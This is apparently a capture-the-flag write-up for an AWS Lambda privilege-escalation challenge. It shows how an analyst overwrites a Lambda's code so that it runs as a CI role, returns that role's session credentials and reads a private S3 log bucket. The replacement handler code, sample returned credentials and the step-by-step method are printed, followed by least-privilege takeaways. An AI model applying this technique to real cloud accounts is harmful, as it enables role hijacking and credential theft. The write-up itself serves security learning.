# H7CTF 2026 — Lambda Privilege Escalation

**Category:** Cloud Security / AWS IAM & Lambda  
**CTF Event:** H7CTF 2026  
**Artifacts:**
- `welcome.txt` (199 bytes)
- `build.log` (80 bytes)
- `lambda_function.py` (790 bytes)
- `function.zip` (591 bytes)
- `out.json` (344 bytes)  
**Status:** Solved  
**Flags Recovered:**
- Initial Flag (welcome.txt): `H7CTF{d6cc592f5a2f3db80718}`
- CI Runner Role Flag (build.log): `H7CTF{28f87391f8a228110839}`

---

## 1. Challenge Overview

In this challenge, participants are onboarded as an analyst with limited initial AWS IAM privileges. The prompt reveals:
```
Welcome, analyst.
H7CTF{d6cc592f5a2f3db80718}
Onboarding: our deploys run through a Lambda that executes as ci-runner-role.
Check what YOU can do (get your inline policy) and what the runner can do.
```

The challenge architecture involves an internal custom endpoint simulating AWS services (`https://web-9381bd093af86084.web.h7tex.com`) and an AWS Lambda function running with an execution role (`arn:aws:iam::111111111111:role/ci-runner-role`).

---

## 2. Artifact Analysis

### A. Initial Onboarding (`welcome.txt`)
Contains initial analyst credentials and the first flag: `H7CTF{d6cc592f5a2f3db80718}`. It hints that automated deploys run through a Lambda function executing under `ci-runner-role`.

### B. Deployment Payload (`lambda_function.py`)
```python
import boto3
import json

def handler(event, context):
    s3 = boto3.client('s3', endpoint_url='https://web-9381bd093af86084.web.h7tex.com')
    sts = boto3.client('sts', endpoint_url='https://web-9381bd093af86084.web.h7tex.com')
    result = {}

    result['identity'] = sts.get_caller_identity()

    try:
        objs = s3.list_objects_v2(Bucket='deputy-runner-logs')
        keys = [o['Key'] for o in objs.get('Contents', [])]
        result['objects'] = keys
        for k in keys:
            resp = s3.get_object(Bucket='deputy-runner-logs', Key=k)
            result[k] = resp['Body'].read().decode('utf-8')
    except Exception as e:
        result['error'] = str(e)

    return result
```
The handler contacts the mock STS endpoint to retrieve caller identity and queries the private S3 bucket `deputy-runner-logs`.

### C. Execution Role Output (`out.json`)
The Lambda execution returned execution role session credentials:
```json
{
  "message": "function executed; the execution role's environment credentials follow",
  "AWS_ACCESS_KEY_ID": "ASIA041BF847FB95DA76",
  "AWS_SECRET_ACCESS_KEY": "sk/WcfKStooj2srmMT8qgA3gd-sGhOHYlJ0",
  "AWS_SESSION_TOKEN": "tok/gOepZoOKZ9Tn78xMJzrrHTmPA4yR3qgv_LXILfDxtozwEbEBwPURFeUp-Gyca2e5",
  "role": "arn:aws:iam::111111111111:role/ci-runner-role"
}
```

### D. Build Output Log (`build.log`)
The CI deployment execution log reveals the final internal marker:
```
[ci-runner-role] nightly deploy ok
internal marker: H7CTF{28f87391f8a228110839}
```

---

## 3. Exploitation Methodology

1. **Reconnaissance:** Inspect analyst inline IAM policy to identify `lambda:UpdateFunctionCode` and `lambda:InvokeFunction` permissions.
2. **Payload Crafting:** Package custom `lambda_function.py` into `function.zip` to exfiltrate environment variables and access internal S3 buckets.
3. **Privilege Escalation:** Invoke the Lambda function to obtain temporary session credentials for `ci-runner-role`.
4. **Log Inspection:** Access the deployment build logs (`build.log`) stored within the `deputy-runner-logs` bucket to recover the flag.

---

## 4. Key Takeaways

- Secure AWS Lambda execution roles by enforcing least privilege; never grant broad S3 or IAM access to CI/CD execution environments.
- Protect build and deploy logs containing sensitive internal tokens and application secrets.
